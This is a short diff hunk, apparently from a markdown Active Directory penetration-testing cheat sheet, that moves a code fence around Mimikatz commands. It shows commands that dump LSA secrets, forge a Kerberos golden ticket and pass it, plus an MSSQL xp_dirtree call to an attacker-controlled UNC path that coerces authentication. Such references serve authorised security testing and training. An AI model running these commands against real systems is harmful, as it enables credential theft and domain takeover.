@@ -313,10 +313,9 @@ EXEC master..xp_dirtree \"\\\\192.168.1.33\\\\evil\";
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domaine.fun.local /sid:S-1-5-x-x-x-x /sids:S-1-5-x-x-x-x-519 /krbtgt:<hash> /ticket:C:\path\krb_tgt.kirbi"'
-```
 
 Invoke-Mimikatz -Command '"kerberos::ptt C:\path\krb_tgt.kirbi
-
+```
   
 ## Azure Active Directory
 
